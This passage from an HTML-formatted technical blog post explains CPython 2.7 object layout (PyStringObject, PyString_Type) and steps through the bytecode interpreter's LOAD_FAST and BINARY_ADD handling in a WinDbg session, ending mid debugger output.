</span><span class='line'>  <span class="kt">int</span> <span class="n">ob_sstate</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">ob_sval</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>  <span class="cm">/* Invariants:</span>
</span><span class='line'><span class="cm">   *     ob_sval contains space for &#39;ob_size+1&#39; elements.</span>
</span><span class='line'><span class="cm">   *     ob_sval[ob_size] == 0.</span>
</span><span class='line'><span class="cm">   *     ob_shash is the hash of the string or -1 if not computed yet.</span>
</span><span class='line'><span class="cm">   *     ob_sstate != 0 iff the string object is in stringobject.c&#39;s</span>
</span><span class='line'><span class="cm">   *       &#39;interned&#39; dictionary; in this case the two references</span>
</span><span class='line'><span class="cm">   *       from &#39;interned&#39; to this object are *not counted* in ob_refcnt.</span>
</span><span class='line'><span class="cm">   */</span>
</span><span class='line'><span class="p">}</span> <span class="n">PyStringObject</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Now, some of you may ask themselves &ldquo;How does Python know the type of an object when it receives a pointer ?&rdquo;. In fact, this is exactly the role of the field <em>ob_type</em>. Python exports a <em>_typeobject</em> static variable that describes the type of the object. Here is, for instance the <em>PyString_Type</em>:</p>

<figure class='code'><figcaption><span>PyString_Type</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">PyTypeObject</span> <span class="n">PyString_Type</span> <span class="o">=</span> <span class="p">{</span>
</span><span class='line'>  <span class="n">PyVarObject_HEAD_INIT</span><span class="p">(</span><span class="o">&amp;</span><span class="n">PyType_Type</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
</span><span class='line'>  <span class="s">&quot;str&quot;</span><span class="p">,</span>
</span><span class='line'>  <span class="n">PyStringObject_SIZE</span><span class="p">,</span>
</span><span class='line'>  <span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="p">),</span>
</span><span class='line'>  <span class="n">string_dealloc</span><span class="p">,</span>                             <span class="cm">/* tp_dealloc */</span>
</span><span class='line'>  <span class="p">(</span><span class="n">printfunc</span><span class="p">)</span><span class="n">string_print</span><span class="p">,</span>                    <span class="cm">/* tp_print */</span>
</span><span class='line'>  <span class="mi">0</span><span class="p">,</span>                                          <span class="cm">/* tp_getattr */</span>
</span><span class='line'>  <span class="c1">// ...</span>
</span><span class='line'><span class="p">};</span>
</span></code></pre></td></tr></table></div></figure>


<p>Basically, every string objects will have their <em>ob_type</em> fields pointing to that <em>PyString_Type</em> variable. With this cute little trick, Python is able to do type checking like that:</p>

<figure class='code'><figcaption><span>PyString_Check PyString_CheckExact</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#define Py_TYPE(ob)             (((PyObject*)(ob))-&gt;ob_type)</span>
</span><span class='line'><span class="cp">#define PyType_HasFeature(t,f)  (((t)-&gt;tp_flags &amp; (f)) != 0)</span>
</span><span class='line'><span class="cp">#define PyType_FastSubclass(t,f)  PyType_HasFeature(t,f)</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#define PyString_Check(op) \</span>
</span><span class='line'><span class="cp">  PyType_FastSubclass(Py_TYPE(op), Py_TPFLAGS_STRING_SUBCLASS)</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#define PyString_CheckExact(op) (Py_TYPE(op) == &amp;PyString_Type)</span>
</span></code></pre></td></tr></table></div></figure>


<p>With the previous tricks, and the <em>PyObject</em> type defined as follow, Python is able to handle in a generic-fashion the different objects:</p>

<figure class='code'><figcaption><span>PyObject</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">typedef</span> <span class="k">struct</span> <span class="n">_object</span> <span class="p">{</span>
</span><span class='line'>  <span class="n">PyObject_HEAD</span>
</span><span class='line'><span class="p">}</span> <span class="n">PyObject</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>So when you are in your debugger and you want to know what type of object it is, you can use that field to identify easily the type of the object you are dealing with:</p>

<figure class='code'><figcaption><span>ob_type really useful when debugging</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>0:000&gt; dps 026233b0 l2
</span><span class='line'>026233b0  00000001
</span><span class='line'>026233b4  1e226798 python27!PyString_Type
</span></code></pre></td></tr></table></div></figure>


<p>Once you have done that, you can dump the variable part describing your object to extract the information you want.
By the way, all the native objects are implemented in the <a href="https://github.com/python-git/python/tree/master/Objects">Objects/</a> directory.</p>

<h3>Debugging session: stepping the VM. The hard way.</h3>

<p>It&rsquo;s time for us to go a little bit deeper, at the assembly level, where we belong ; so let&rsquo;s define a dummy function like this one:</p>

<figure class='code'><figcaption><span>dummy function</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">def</span> <span class="nf">a</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="n">c</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">b</span> <span class="o">+</span> <span class="n">c</span>
</span></code></pre></td></tr></table></div></figure>


<p>Now using the Python&rsquo;s <a href="http://docs.python.org/2/library/dis.html">dis</a> module, we can disassemble the function object <em>a</em>:</p>

<figure class='code'><figcaption><span>disassemble a</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>In [20]: dis.dis(a)
</span><span class='line'>2   0 LOAD_FAST                0 (b)
</span><span class='line'>    3 LOAD_FAST                1 (c)
</span><span class='line'>    6 BINARY_ADD
</span><span class='line'>    7 RETURN_VALUE
</span><span class='line'>In [21]: a.func_code.co_code
</span><span class='line'>In [22]: print &#39;&#39;.join(&#39;\\x%.2x&#39; % ord(i) for i in a.__code__.co_code)
</span><span class='line'>\x7c\x00\x00\x7c\x01\x00\x17\x53
</span><span class='line'>
</span><span class='line'>In [23]: opcode.opname[0x7c]
</span><span class='line'>Out[23]: &#39;LOAD_FAST&#39;
</span><span class='line'>In [24]: opcode.opname[0x17]
</span><span class='line'>Out[24]: &#39;BINARY_ADD&#39;
</span><span class='line'>In [25]: opcode.opname[0x53]
</span><span class='line'>Out[25]: &#39;RETURN_VALUE&#39;
</span></code></pre></td></tr></table></div></figure>


<p>Keep in mind, as we said earlier, that everything is an object ; so a function is an object, and bytecode is an object as well:</p>

<figure class='code'><figcaption><span>PyFunctionObject PyCodeObject</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
</span><span class='line'>  <span class="n">PyObject_HEAD</span>
</span><span class='line'>  <span class="n">PyObject</span> <span class="o">*</span><span class="n">func_code</span><span class="p">;</span>  <span class="cm">/* A code object */</span>
</span><span class='line'>  <span class="c1">// ...</span>
</span><span class='line'><span class="p">}</span> <span class="n">PyFunctionObject</span><span class="p">;</span>
</span><span class='line'><span class="cm">/* Bytecode object */</span>
</span><span class='line'><span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">PyObject_HEAD</span>
</span><span class='line'>    <span class="c1">//...</span>
</span><span class='line'>    <span class="n">PyObject</span> <span class="o">*</span><span class="n">co_code</span><span class="p">;</span>    <span class="cm">/* instruction opcodes */</span>
</span><span class='line'>    <span class="c1">//...</span>
</span><span class='line'><span class="p">}</span> <span class="n">PyCodeObject</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Time to attach my debugger to the interpreter to see what&rsquo;s going on in that weird-machine, and to place a conditional breakpoint on <a href="https://github.com/python-git/python/blob/master/Python/ceval.c#L667">PyEval_EvalFrameEx</a>.
Once you did that, you can call the dummy function:</p>

<figure class='code'><figcaption><span>windbg breakpoint</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>0:000&gt; bp python27!PyEval_EvalFrameEx+0x2b2 &quot;.if(poi(ecx+4) == 0x53170001){}.else{g}&quot;
</span><span class='line'>breakpoint 0 redefined
</span><span class='line'>0:000&gt; g
</span><span class='line'>eax=025ea914 ebx=00000000 ecx=025ea914 edx=026bef98 esi=1e222c0c edi=02002e38
</span><span class='line'>eip=1e0ec562 esp=0027fcd8 ebp=026bf0d8 iopl=0         nv up ei pl zr na pe nc
</span><span class='line'>cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
</span><span class='line'>python27!PyEval_EvalFrameEx+0x2b2:
</span><span class='line'>1e0ec562 0fb601          movzx   eax,byte ptr [ecx]         ds:002b:025ea914=7c
</span><span class='line'>
</span><span class='line'>0:000&gt; db ecx l8
</span><span class='line'>025ea914  7c 00 00 7c 01 00 17 53                          |..|...S
</span></code></pre></td></tr></table></div></figure>


<p>OK perfect, we are in the middle of the VM, and our function is being evaluated. The register <em>ECX</em> points to the bytecode being evaluated, and the first opcode is <em>LOAD_FAST</em>.</p>

<p>Basically, this opcode takes an object in the <em>fastlocals</em> array, and push it on the virtual stack. In our case, as we saw in both the disassembly and the bytecode dump, we are going to load the index 0 (the argument <em>b</em>), then the index 1 (argument <em>c</em>).</p>

<p>Here&rsquo;s what it looks like in the debugger ; first step is to load the <em>LOAD_FAST</em> opcode:</p>

<figure class='code'><figcaption><span>fetching the LOAD_FAST opcode</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>0:000&gt;
</span><span class='line'>eax=025ea914 ebx=00000000 ecx=025ea914 edx=026bef98 esi=1e222c0c edi=02002e38
</span><span class='line'>eip=1e0ec562 esp=0027fcd8 ebp=026bf0d8 iopl=0         nv up ei pl zr na pe nc
</span><span class='line'>cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
</span><span class='line'>python27!PyEval_EvalFrameEx+0x2b2:
</span><span class='line'>1e0ec562 0fb601          movzx   eax,byte ptr [ecx]         ds:002b:025ea914=7c
</span></code></pre></td></tr></table></div></figure>


<p>In <em>ECX</em> we have a pointer onto the opcodes of the function being evaluated, our dummy function. <em>0x7c</em> is the value of the <em>LOAD_FAST</em> opcode as we can see:</p>

<figure class='code'><figcaption><span>LOAD_FAST</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#define LOAD_FAST 124 </span><span class="cm">/* Local variable number */</span><span class="cp"></span>
</span></code></pre></td></tr></table></div></figure>


<p>Then, the function needs to check if the opcode has argument or not, and that&rsquo;s done by comparing the opcode with a constant value called <em>HAVE_ARGUMENT</em>:</p>

<figure class='code'><figcaption><span>Checking if the opcode has an argument</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>0:000&gt;
</span><span class='line'>eax=0000007c ebx=00000000 ecx=025ea915 edx=026bef98 esi=1e222c0c edi=00000000
</span><span class='line'>eip=1e0ec568 esp=0027fcd8 ebp=026bf0d8 iopl=0         nv up ei pl zr na pe nc
</span><span class='line'>cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
</span><span class='line'>python27!PyEval_EvalFrameEx+0x2b8:
</span><span class='line'>1e0ec568 83f85a          cmp     eax,5Ah
</span></code></pre></td></tr></table></div></figure>


<p>Again, we can verify the value to be sure we understand what we are doing:</p>

<figure class='code'><figcaption><span>opcode.HAVE_ARGUMENT</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">In</span> <span class="p">[</span><span class="mi">11</span><span class="p">]:</span> <span class="s">&#39;</span><span class="si">%x</span><span class="s">&#39;</span> <span class="o">%</span> <span class="n">opcode</span><span class="o">.</span><span class="n">HAVE_ARGUMENT</span>
</span><span class='line'><span class="n">Out</span><span class="p">[</span><span class="mi">11</span><span class="p">]:</span> <span class="s">&#39;5a&#39;</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span>HAS_ARG</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#define HAS_ARG(op) ((op) &gt;= HAVE_ARGUMENT)</span>
</span></code></pre></td></tr></table></div></figure>


<p>If the opcode has an argument, the function needs to retrieve it (it&rsquo;s one byte):</p>

<figure class='code'><figcaption><span>Fetching the argument</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>0:000&gt;
</span><span class='line'>eax=0000007c ebx=00000000 ecx=025ea915 edx=026bef98 esi=1e222c0c edi=00000000
</span><span class='line'>eip=1e0ec571 esp=0027fcd8 ebp=026bf0d8 iopl=0         nv up ei pl nz na pe nc
</span><span class='line'>cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200206
</span><span class='line'>python27!PyEval_EvalFrameEx+0x2c1:
</span><span class='line'>1e0ec571 0fb67901        movzx   edi,byte ptr [ecx+1]       ds:002b:025ea916=00
</span></code></pre></td></tr></table></div></figure>


<p>As expected for the first <em>LOAD_FAST</em> the argument is <em>0x00</em>, perfect.
After that the function dispatches the execution flow to the <em>LOAD_FAST</em> case defined as follow:</p>

<figure class='code'><figcaption><span>LOAD_FAST definition</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#define GETLOCAL(i)     (fastlocals[i])</span>
</span><span class='line'><span class="cp">#define Py_INCREF(op) (                         \</span>
</span><span class='line'><span class="cp">    _Py_INC_REFTOTAL  _Py_REF_DEBUG_COMMA       \</span>
</span><span class='line'><span class="cp">    ((PyObject*)(op))-&gt;ob_refcnt++)</span>
</span><span class='line'><span class="cp">#define PUSH(v)                BASIC_PUSH(v)</span>
</span><span class='line'><span class="cp">#define BASIC_PUSH(v)     (*stack_pointer++ = (v))</span>
</span><span class='line'>
</span><span class='line'><span class="k">case</span> <span class="n">LOAD_FAST</span>:
</span><span class='line'>  <span class="n">x</span> <span class="o">=</span> <span class="n">GETLOCAL</span><span class="p">(</span><span class="n">oparg</span><span class="p">);</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">x</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">Py_INCREF</span><span class="p">(</span><span class="n">x</span><span class="p">);</span>
</span><span class='line'>    <span class="n">PUSH</span><span class="p">(</span><span class="n">x</span><span class="p">);</span>
</span><span class='line'>    <span class="k">goto</span> <span class="n">fast_next_opcode</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="c1">//...</span>
</span><span class='line'>  <span class="k">break</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s see what it looks like in assembly:</p>

<figure class='code'><figcaption><span>Loads the fastlocals array (026bef98)</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>0:000&gt;
</span><span class='line'>eax=0000007c ebx=00000000 ecx=0000007b edx=00000059 esi=1e222c0c edi=00000000
</span><span class='line'>eip=1e0ec5cf esp=0027fcd8 ebp=026bf0d8 iopl=0         nv up ei ng nz na po cy
</span><span class='line'>cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200283
</span><span class='line'>python27!PyEval_EvalFrameEx+0x31f:
</span><span class='line'>1e0ec5cf 8b54246c        mov     edx,dword ptr [esp+6Ch] ss:002b:0027fd44=98ef6b02
</span></code></pre></td></tr></table></div></figure>


<p>After getting the <em>fastlocals</em>, we can retrieve an entry:</p>

<figure class='code'><figcaption><span>Retrieve the entry 0 of the fastlocals array</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>0:000&gt;
</span><span class='line'>eax=0000007c ebx=00000000 ecx=0000007b edx=026bef98 esi=1e222c0c edi=00000000
</span><span class='line'>eip=1e0ec5d3 esp=0027fcd8 ebp=026bf0d8 iopl=0         nv up ei ng nz na po cy
</span><span class='line'>cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200283
</span><span class='line'>python27!PyEval_EvalFrameEx+0x323:
</span><span class='line'>1e0ec5d3 8bb4ba38010000  mov     esi,dword ptr [edx+edi*4+138h] ds:002b:026bf0d0=a0aa5e02
</span></code></pre></td></tr></table></div></figure>


<p>Also keep in mind we called our dummy function with two strings, so let&rsquo;s actually check it is a string object:</p>

<figure class='code'><figcaption><span>Type checking</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>0:000&gt; dps 025eaaa0 l2
</span><span class='line'>025eaaa0  00000004
</span><span class='line'>025eaaa4  1e226798 python27!PyString_Type
</span></code></pre></td></tr></table></div></figure>


<p>Perfect, now according to the definition of <em>PyStringObject</em>:</p>

<figure class='code'><figcaption><span>PyStringObject</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">PyObject_VAR_HEAD</span>
</span><span class='line'>    <span class="kt">long</span> <span class="n">ob_shash</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">ob_sstate</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">char</span> <span class="n">ob_sval</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
</span><span class='line'><span class="p">}</span> <span class="n">PyStringObject</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>We should find the content of the string directly in the object:</p>

<figure class='code'><figcaption><span>Finding the string in the PyStringObject</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>0:000&gt; db 025eaaa0 l1f
</span><span class='line'>025eaaa0  04 00 00 00 98 67 22 1e-05 00 00 00 dd 16 30 43  .....g&quot;.......0C
</span><span class='line'>025eaab0  01 00 00 00 48 65 6c 6c-6f 00 00 00 ff ff ff     ....Hello......
</span></code></pre></td></tr></table></div></figure>


<p>Awesome, we have the size of the string at the offset <em>0x8</em>, and the actual string is at <em>0x14</em>.</p>

<p>Let&rsquo;s move on to the second opcode now, this time with less details though:</p>

<figure class='code'><figcaption><span>Fetching the second LOAD_FAST opcode</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>0:000&gt;
</span><span class='line'>eax=0000007c ebx=00000000 ecx=025ea917 edx=026bef98 esi=025eaaa0 edi=00000000
</span><span class='line'>eip=1e0ec562 esp=0027fcd8 ebp=026bf0dc iopl=0         nv up ei pl zr na pe nc
</span><span class='line'>cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
</span><span class='line'>python27!PyEval_EvalFrameEx+0x2b2:
</span><span class='line'>1e0ec562 0fb601          movzx   eax,byte ptr [ecx]         ds:002b:025ea917=7c
</span></code></pre></td></tr></table></div></figure>


<p>This time, we are loading the second argument, so the index 1 of <em>fastlocals</em>.
We can type-check the object and dump the string stored in it:</p>

<figure class='code'><figcaption><span>Retrieving the index 1 of fastlocals (025ea9c0)</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>0:000&gt;
</span><span class='line'>eax=0000007c ebx=00000000 ecx=0000007b edx=026bef98 esi=025eaaa0 edi=00000001
</span><span class='line'>eip=1e0ec5d3 esp=0027fcd8 ebp=026bf0dc iopl=0         nv up ei ng nz na po cy
</span><span class='line'>cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200283
</span><span class='line'>python27!PyEval_EvalFrameEx+0x323:
</span><span class='line'>1e0ec5d3 8bb4ba38010000  mov     esi,dword ptr [edx+edi*4+138h] ds:002b:026bf0d4=c0af5e02
</span><span class='line'>0:000&gt; db poi(026bf0d4) l1f
</span><span class='line'>025eafc0  04 00 00 00 98 67 22 1e-05 00 00 00 39 4a 25 29  .....g&quot;.....9J%)
</span><span class='line'>025eafd0  01 00 00 00 57 6f 72 6c-64 00 5e 02 79 00 00     ....World.^.y..
</span></code></pre></td></tr></table></div></figure>


<p>Comes now the <em>BINARY_ADD</em> opcode:</p>

<figure class='code'><figcaption><span>Fetching the BINARY_ADD opcode</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>0:000&gt;
</span><span class='line'>eax=0000007c ebx=00000000 ecx=025ea91a edx=026bef98 esi=025eafc0 edi=00000001
</span><span class='line'>eip=1e0ec562 esp=0027fcd8 ebp=026bf0e0 iopl=0         nv up ei pl zr na pe nc
</span><span class='line'>cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
</span><span class='line'>python27!PyEval_EvalFrameEx+0x2b2:
</span><span class='line'>1e0ec562 0fb601          movzx   eax,byte ptr [ecx]         ds:002b:025ea91a=17
</span></code></pre></td></tr></table></div></figure>


<p>Here it&rsquo;s supposed to retrieve the two objects on the top-of-stack, and add them.
The C code looks like this:</p>

<figure class='code'><figcaption><span>BINARY_ADD</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#define SET_TOP(v)        (stack_pointer[-1] = (v))</span>
</span><span class='line'>
</span><span class='line'><span class="k">case</span> <span class="n">BINARY_ADD</span>:
</span><span class='line'>  <span class="n">w</span> <span class="o">=</span> <span class="n">POP</span><span class="p">();</span>
</span><span class='line'>  <span class="n">v</span> <span class="o">=</span> <span class="n">TOP</span><span class="p">();</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">PyInt_CheckExact</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">PyInt_CheckExact</span><span class="p">(</span><span class="n">w</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="c1">// Not our case</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">PyString_CheckExact</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
</span><span class='line'>           <span class="n">PyString_CheckExact</span><span class="p">(</span><span class="n">w</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">x</span> <span class="o">=</span> <span class="n">string_concatenate</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="n">w</span><span class="p">,</span> <span class="n">f</span><span class="p">,</span> <span class="n">next_instr</span><span class="p">);</span>
</span><span class='line'>      <span class="cm">/* string_concatenate consumed the ref to v */</span>
</span><span class='line'>      <span class="k">goto</span> <span class="n">skip_decref_vx</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>    <span class="c1">// Not our case</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="n">Py_DECREF</span><span class="p">(</span><span class="n">v</span><span class="p">);</span>
</span><span class='line'><span class="nl">skip_decref_vx:</span>
</span><span class='line'>  <span class="n">Py_DECREF</span><span class="p">(</span><span class="n">w</span><span class="p">);</span>
</span><span class='line'>  <span class="n">SET_TOP</span><span class="p">(</span><span class="n">x</span><span class="p">);</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">x</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="k">continue</span><span class="p">;</span>
</span><span class='line'>  <span class="k">break</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>And here is the assembly version where it retrieves the two objects from the top-of-stack:</p>

<figure class='code'><figcaption><span>POP and TOP</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>0:000&gt;
